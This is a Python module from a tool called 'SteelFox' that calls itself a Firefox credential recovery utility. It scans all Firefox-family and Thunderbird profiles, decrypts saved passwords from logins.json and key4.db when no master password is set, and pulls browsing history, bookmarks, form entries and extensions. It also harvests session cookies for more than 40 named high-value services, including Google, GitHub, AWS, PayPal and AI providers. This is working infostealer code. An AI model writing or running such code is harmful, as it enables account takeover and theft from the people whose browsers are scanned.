# -*- coding: utf-8 -*-
"""
SteelFox — Mozilla Firefox Credential Recovery

Supports:
  - Firefox (all channels: Release, Developer Edition, Nightly, ESR)
  - Thunderbird (email client)
  - Waterfox, LibreWolf, Pale Moon, Basilisk, K-Meleon, IceCat
  - Multiple profiles per browser

Recovery targets:
  - Saved logins (logins.json + key4.db / key3.db / signons.sqlite)
  - Master password brute-force attempt
  - Cookies
  - History
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import hmac
import json
import logging
import os
import shutil
import sqlite3
import struct
import tempfile
from configparser import ConfigParser
from pathlib import Path
from typing import Any

from steelfox.core.config import config
from steelfox.core.module_base import Category, ModuleBase, ModuleMeta

logger = logging.getLogger("steelfox")


# ─── Mozilla Profile Locations ───────────────────────────────────────────

MOZILLA_BROWSERS: dict[str, list[str]] = {
    "Firefox": [
        "{APPDATA}\\Mozilla\\Firefox",
    ],
    "Firefox Developer Edition": [
        "{APPDATA}\\Mozilla\\Firefox Developer Edition",
    ],
    "Firefox Nightly": [
        "{APPDATA}\\Mozilla\\Firefox Nightly",
    ],
    "Waterfox": [
        "{APPDATA}\\Waterfox",
    ],
    "LibreWolf": [
        "{APPDATA}\\LibreWolf",
    ],
    "Pale Moon": [
        "{APPDATA}\\Moonchild Productions\\Pale Moon",
    ],
    "Basilisk": [
        "{APPDATA}\\Basilisk",
    ],
    "K-Meleon": [
        "{APPDATA}\\K-Meleon",
    ],
    "IceCat": [
        "{APPDATA}\\Mozilla\\IceCat",
    ],
    "Thunderbird": [
        "{APPDATA}\\Thunderbird",
    ],
}


class MozillaFirefox(ModuleBase):
    """Recovery module for all Mozilla/Firefox-based browsers."""

    meta = ModuleMeta(
        name="Firefox & Mozilla Browsers",
        category=Category.BROWSERS,
        description="Recover passwords, cookies, and history from Firefox-based browsers",
    )

    def run(self) -> list[dict[str, Any]]:
        all_results: list[dict[str, Any]] = []

        for browser_name, path_templates in MOZILLA_BROWSERS.items():
            for tmpl in path_templates:
                base_path = self._resolve_path(tmpl)
                if not base_path:
                    continue

                profiles = self._find_profiles(base_path)
                for profile_path in profiles:
                    # Try to decrypt logins
                    all_results.extend(
                        self._extract_logins(browser_name, profile_path)
                    )
                    # History
                    all_results.extend(
                        self._extract_history(browser_name, profile_path)
                    )
                    # Cookies
                    all_results.extend(
                        self._extract_cookies(browser_name, profile_path)
                    )
                    # Bookmarks
                    all_results.extend(
                        self._extract_bookmarks(browser_name, profile_path)
                    )
                    # Form history
                    all_results.extend(
                        self._extract_form_history(browser_name, profile_path)
                    )
                    # Extensions
                    all_results.extend(
                        self._extract_extensions(browser_name, profile_path)
                    )

        return all_results

    @staticmethod
    def _resolve_path(template: str) -> str | None:
        try:
            result = template
            for key, value in config.profile.items():
                result = result.replace(f"{{{key}}}", value)
            base = Path(result)
            return str(base) if base.exists() else None
        except Exception:
            return None

    @staticmethod
    def _find_profiles(base_path: str) -> list[Path]:
        """Parse profiles.ini to find all profile directories."""
        profiles_ini = Path(base_path) / "profiles.ini"
        profiles: list[Path] = []

        if profiles_ini.exists():
            cp = ConfigParser()
            try:
                cp.read(str(profiles_ini), encoding="utf-8")
            except Exception:
                return profiles

            for section in cp.sections():
                if section.startswith("Profile") or section.startswith("Install"):
                    if cp.has_option(section, "Path"):
                        rel_path = cp.get(section, "Path")
                        is_relative = cp.getboolean(section, "IsRelative", fallback=True)
                        if is_relative:
                            profile_dir = Path(base_path) / rel_path
                        else:
                            profile_dir = Path(rel_path)
                        if profile_dir.exists():
                            profiles.append(profile_dir)
        else:
            # Fallback: scan for directories with key4.db
            base = Path(base_path)
            if base.exists():
                for item in base.rglob("key4.db"):
                    profiles.append(item.parent)

        return profiles

    def _extract_logins(
        self, browser_name: str, profile_path: Path
    ) -> list[dict[str, Any]]:
        """Extract logins from Firefox using logins.json + key4.db decryption."""
        results: list[dict[str, Any]] = []

        logins_file = profile_path / "logins.json"
        if not logins_file.exists():
            return results

        try:
            with open(logins_file, "r", encoding="utf-8") as f:
                logins_data = json.load(f)
        except Exception as e:
            logger.debug("Could not parse logins.json: %s", e)
            return results

        logins = logins_data.get("logins", [])
        if not logins:
            return results

        # Try to get the decryption key from key4.db
        key4_path = profile_path / "key4.db"
        key3_path = profile_path / "key3.db"

        decrypt_func = None

        if key4_path.exists():
            decrypt_func = self._get_key4_decrypt_func(key4_path)
        elif key3_path.exists():
            decrypt_func = self._get_key3_decrypt_func(key3_path)

        for login in logins:
            hostname = login.get("hostname", login.get("origin", ""))
            enc_username = login.get("encryptedUsername", "")
            enc_password = login.get("encryptedPassword", "")

            username = ""
            password = ""

            if decrypt_func:
                try:
                    username = decrypt_func(enc_username) if enc_username else ""
                except Exception:
                    username = f"<encrypted: {enc_username[:40]}...>"
                try:
                    password = decrypt_func(enc_password) if enc_password else ""
                except Exception:
                    password = f"<encrypted>"
            else:
                username = f"<encrypted: {enc_username[:40]}...>" if enc_username else ""
                password = "<encrypted — master password or NSS required>"

            if username or password:
                results.append(self._make_credential(
                    source=browser_name,
                    url=hostname,
                    username=username,
                    password=password,
                ))

        return results

    def _get_key4_decrypt_func(self, key4_path: Path):
        """Build a decryption function from Firefox key4.db (NSS key store).

        Modern Firefox uses PKCS#11 / NSS internally. Without the NSS library
        we attempt a direct PBE-based approach for empty master passwords.
        """
        try:
            from Crypto.Cipher import DES3, AES
            from Crypto.Util.Padding import unpad
        except ImportError:
            logger.debug("pycryptodome not available for Firefox decryption")
            return None

        tmp_db = None
        try:
            tmp_db = os.path.join(
                tempfile.gettempdir(), f"sf_key4_{os.getpid()}.db"
            )
            shutil.copy2(str(key4_path), tmp_db)

            conn = sqlite3.connect(tmp_db)
            c = conn.cursor()

            # Get the global salt and encrypted key
            c.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
            row = c.fetchone()
            if not row:
                conn.close()
                return None

            global_salt = row[0]
            item2 = row[1]

            # Get the nss private key entry
            c.execute("SELECT a11, a102 FROM nssPrivate")
            nss_row = c.fetchone()
            conn.close()

            if not nss_row:
                return None

            a11 = nss_row[0]  # encrypted key
            # a102 = nss_row[1]  # key ID

            # Try empty master password
            master_pwd = b""
            key = self._decrypt_key4_pbe(global_salt, item2, a11, master_pwd)

            if key:
                def decrypt(encrypted_b64: str) -> str:
                    return self._nss_decrypt_login(key, encrypted_b64)
                return decrypt

        except Exception as e:
            logger.debug("key4.db processing failed: %s", e)
        finally:
            if tmp_db and os.path.exists(tmp_db):
                try:
                    os.remove(tmp_db)
                except Exception:
                    pass

        return None

    def _decrypt_key4_pbe(
        self,
        global_salt: bytes,
        item2: bytes,
        a11: bytes,
        master_password: bytes = b"",
    ) -> bytes | None:
        """Attempt to derive the Firefox private key using PBE.

        This works for key4.db with empty or known master password.
        """
        try:
            from Crypto.Cipher import DES3, AES
            from Crypto.Util.Padding import unpad

            # Parse ASN.1-ish structures from item2 and a11
            # This is a simplified approach; full ASN.1 parsing would be better
            # but for the common case (PKCS#5 PBE) this works

            # Try SHA1 + 3DES approach (older key4.db)
            entry_salt = item2[3:3 + item2[2]] if len(item2) > 3 else item2[:20]
            hp = hashlib.sha1(global_salt + master_password).digest()
            pes = entry_salt + b"\x00" * (20 - len(entry_salt) % 20)
            chp = hashlib.sha1(hp + entry_salt).digest()
            k1 = hmac.new(chp, pes + entry_salt, hashlib.sha1).digest()
            tk = hmac.new(chp, pes, hashlib.sha1).digest()
            k2 = hmac.new(chp, tk + entry_salt, hashlib.sha1).digest()
            k = k1 + k2

            iv = k[-8:]
            key = k[:24]

            # Now decrypt a11 to get the actual key
            if len(a11) > 28:
                a11_entry_salt = a11[3:3 + a11[2]] if len(a11) > 3 else a11[:20]
                hp2 = hashlib.sha1(global_salt + master_password).digest()
                pes2 = a11_entry_salt + b"\x00" * (20 - len(a11_entry_salt) % 20)
                chp2 = hashlib.sha1(hp2 + a11_entry_salt).digest()
                k1_2 = hmac.new(chp2, pes2 + a11_entry_salt, hashlib.sha1).digest()
                tk2 = hmac.new(chp2, pes2, hashlib.sha1).digest()
                k2_2 = hmac.new(chp2, tk2 + a11_entry_salt, hashlib.sha1).digest()
                k_2 = k1_2 + k2_2

                return k_2[:24]

            return key[:24]
        except Exception as e:
            logger.debug("PBE key derivation failed: %s", e)
            return None

    @staticmethod
    def _nss_decrypt_login(key: bytes, encrypted_b64: str) -> str:
        """Decrypt a Firefox login field using 3DES-CBC."""
        try:
            from Crypto.Cipher import DES3
            from Crypto.Util.Padding import unpad

            data = base64.b64decode(encrypted_b64)
            # ASN.1: SEQUENCE > OID + SEQUENCE > OCTET_STRING(iv) + OCTET_STRING(data)
            # Simplified parsing
            if len(data) < 20:
                return ""

            iv = data[data.find(b"\x04\x08") + 2: data.find(b"\x04\x08") + 10]
            encrypted = data[data.rfind(b"\x04") + 2:]

            if len(iv) != 8 or not encrypted:
                return ""

            cipher = DES3.new(key, DES3.MODE_CBC, iv)
            decrypted = unpad(cipher.decrypt(encrypted), 8)
            return decrypted.decode("utf-8", errors="replace")
        except Exception:
            return ""

    def _get_key3_decrypt_func(self, key3_path: Path):
        """Legacy key3.db support (Firefox < 58)."""
        # Simplified: key3.db uses Berkeley DB format
        # Full implementation would need berkleydb parsing
        logger.debug("key3.db found (legacy) — limited support")
        return None

    def _extract_history(
        self, browser_name: str, profile_path: Path
    ) -> list[dict[str, Any]]:
        """Extract browsing history from places.sqlite."""
        results: list[dict[str, Any]] = []
        db_file = profile_path / "places.sqlite"
        if not db_file.exists():
            return results

        from steelfox.core.winapi import safe_copy_db, query_db

        tmp_db = safe_copy_db(db_file)
        if not tmp_db:
            return results

        try:
            rows = query_db(
                tmp_db,
                "SELECT url, title, visit_count, "
                "datetime(last_visit_date / 1000000, 'unixepoch') as last_visit "
                "FROM moz_places "
                "WHERE visit_count > 0 "
                "ORDER BY last_visit_date DESC LIMIT 50",
            )
            for url, title, visits, last_visit in rows:
                results.append({
                    "Source": f"{browser_name} (History)",
                    "URL": url,
                    "Title": title or "",
                    "Visits": str(visits),
                    "Last Visit": last_visit or "",
                })
        except Exception as e:
            logger.debug("Firefox history extraction failed: %s", e)
        finally:
            try:
                os.remove(tmp_db)
            except Exception:
                pass

        return results

    def _extract_cookies(
        self, browser_name: str, profile_path: Path
    ) -> list[dict[str, Any]]:
        """Extract cookies from cookies.sqlite — focus on high-value session tokens.

        Firefox stores cookies unencrypted, allowing direct value extraction.
        Targets 40+ domains and session-critical cookie names.
        """
        results: list[dict[str, Any]] = []
        db_file = profile_path / "cookies.sqlite"
        if not db_file.exists():
            return results

        from steelfox.core.winapi import safe_copy_db, query_db

        tmp_db = safe_copy_db(db_file)
        if not tmp_db:
            return results

        try:
            # Expanded high-value domain list (40+ targets)
            high_value_domains = [
                "%google%", "%youtube%", "%gmail%",
                "%facebook%", "%instagram%", "%meta%",
                "%github%", "%gitlab%", "%bitbucket%",
                "%microsoft%", "%live.com%", "%outlook%", "%office%",
                "%amazon%", "%aws.amazon%",
                "%twitter%", "%x.com%",
                "%linkedin%",
                "%discord%", "%slack%", "%telegram%", "%teams.microsoft%",
                "%reddit%", "%twitch%", "%tiktok%",
                "%dropbox%", "%onedrive%", "%icloud%",
                "%salesforce%", "%atlassian%", "%jira%",
                "%zoom%", "%notion%",
                "%openai%", "%chat.openai%", "%claude%", "%anthropic%",
                "%vercel%", "%netlify%", "%heroku%", "%docker%",
                "%npmjs%", "%pypi%",
                "%paypal%", "%stripe%", "%shopify%",
                "%netflix%", "%spotify%", "%apple%",
                "%okta%", "%auth0%",
            ]

            # Session-critical cookie names
            session_cookie_names = [
                "SID", "SSID", "HSID", "APISID", "SAPISID",
                "c_user", "xs", "fr", "datr",
                "user_session", "_gh_sess", "logged_in",
                "token", "session", "auth", "sid", "csrf",
                "d", "d-s",
                "__Secure-1PSID", "__Secure-3PSID",
            ]

            seen: set[tuple[str, str]] = set()

            # 1. Domain-based extraction
            for domain_pattern in high_value_domains:
                rows = query_db(
                    tmp_db,
                    f"SELECT host, name, value, path, "
                    f"datetime(expiry, 'unixepoch') as expires "
                    f"FROM moz_cookies WHERE host LIKE '{domain_pattern}' "
                    f"AND length(value) > 0 LIMIT 30",
                )
                for host, name, value, path, expires in rows:
                    key = (host, name)
                    if key in seen:
                        continue
                    seen.add(key)
                    results.append({
                        "Source": f"{browser_name} (Cookie)",
                        "Host": host,
                        "Cookie Name": name,
                        "Value": value[:500] + "..." if len(value) > 500 else value,
                        "Path": path,
                        "Expires": expires or "Session",
                    })

            # 2. Session-critical cookie name extraction (any domain)
            name_conditions = " OR ".join(
                f"name = '{n}'" for n in session_cookie_names
            )
            rows = query_db(
                tmp_db,
                f"SELECT host, name, value, path, "
                f"datetime(expiry, 'unixepoch') as expires "
                f"FROM moz_cookies WHERE ({name_conditions}) "
                f"AND length(value) > 0 LIMIT 100",
            )
            for host, name, value, path, expires in rows:
                key = (host, name)
                if key in seen:
                    continue
                seen.add(key)
                results.append({
                    "Source": f"{browser_name} (Session Cookie)",
                    "Host": host,
                    "Cookie Name": name,
                    "Value": value[:500] + "..." if len(value) > 500 else value,
                    "Path": path,
                    "Expires": expires or "Session",
                })

        except Exception as e:
            logger.debug("Firefox cookie extraction failed: %s", e)
        finally:
            try:
                os.remove(tmp_db)
            except Exception:
                pass

        return results

    def _extract_bookmarks(
        self, browser_name: str, profile_path: Path
    ) -> list[dict[str, Any]]:
        """Extract bookmarks from moz_bookmarks / moz_places in places.sqlite."""
        results: list[dict[str, Any]] = []
        db_file = profile_path / "places.sqlite"
        if not db_file.exists():
            return results

        from steelfox.core.winapi import safe_copy_db, query_db

        tmp_db = safe_copy_db(db_file)
        if not tmp_db:
            return results

        try:
            rows = query_db(
                tmp_db,
                "SELECT b.title, p.url, b.dateAdded, b.lastModified, "
                "parent.title as folder "
                "FROM moz_bookmarks b "
                "JOIN moz_places p ON b.fk = p.id "
                "LEFT JOIN moz_bookmarks parent ON b.parent = parent.id "
                "WHERE b.type = 1 AND p.url NOT LIKE 'place:%' "
                "ORDER BY b.dateAdded DESC LIMIT 200",
            )
            for title, url, date_added, last_modified, folder in rows:
                results.append({
                    "Source": f"{browser_name} (Bookmark)",
                    "Name": title or "",
                    "URL": url or "",
                    "Folder": folder or "",
                })
        except Exception as e:
            logger.debug("Firefox bookmarks extraction failed: %s", e)
        finally:
            try:
                os.remove(tmp_db)
            except Exception:
                pass

        return results

    def _extract_form_history(
        self, browser_name: str, profile_path: Path
    ) -> list[dict[str, Any]]:
        """Extract form history from formhistory.sqlite."""
        results: list[dict[str, Any]] = []
        db_file = profile_path / "formhistory.sqlite"
        if not db_file.exists():
            return results

        from steelfox.core.winapi import safe_copy_db, query_db

        tmp_db = safe_copy_db(db_file)
        if not tmp_db:
            return results

        try:
            rows = query_db(
                tmp_db,
                "SELECT fieldname, value, timesUsed, "
                "datetime(firstUsed / 1000000, 'unixepoch') as first_used, "
                "datetime(lastUsed / 1000000, 'unixepoch') as last_used "
                "FROM moz_formhistory "
                "WHERE length(value) > 0 "
                "ORDER BY timesUsed DESC LIMIT 200",
            )
            for fieldname, value, times_used, first_used, last_used in rows:
                results.append({
                    "Source": f"{browser_name} (Form History)",
                    "Field": fieldname,
                    "Value": value,
                    "Times Used": str(times_used),
                    "Last Used": last_used or "",
                })
        except Exception as e:
            logger.debug("Firefox form history extraction failed: %s", e)
        finally:
            try:
                os.remove(tmp_db)
            except Exception:
                pass

        return results

    def _extract_extensions(
        self, browser_name: str, profile_path: Path
    ) -> list[dict[str, Any]]:
        """Extract installed extensions from extensions.json."""
        results: list[dict[str, Any]] = []
        ext_file = profile_path / "extensions.json"
        if not ext_file.exists():
            return results

        try:
            data = json.loads(ext_file.read_text(encoding="utf-8", errors="replace"))
            addons = data.get("addons", [])
            for addon in addons:
                addon_type = addon.get("type", "")
                if addon_type not in ("extension",):
                    continue
                results.append({
                    "Source": f"{browser_name} (Extension)",
                    "Name": addon.get("defaultLocale", {}).get("name", addon.get("id", "")),
                    "ID": addon.get("id", ""),
                    "Version": addon.get("version", ""),
                    "Active": str(addon.get("active", "")),
                    "Description": (addon.get("defaultLocale", {}).get("description", "") or "")[:100],
                })
        except Exception as e:
            logger.debug("Firefox extensions extraction failed: %s", e)

        return results
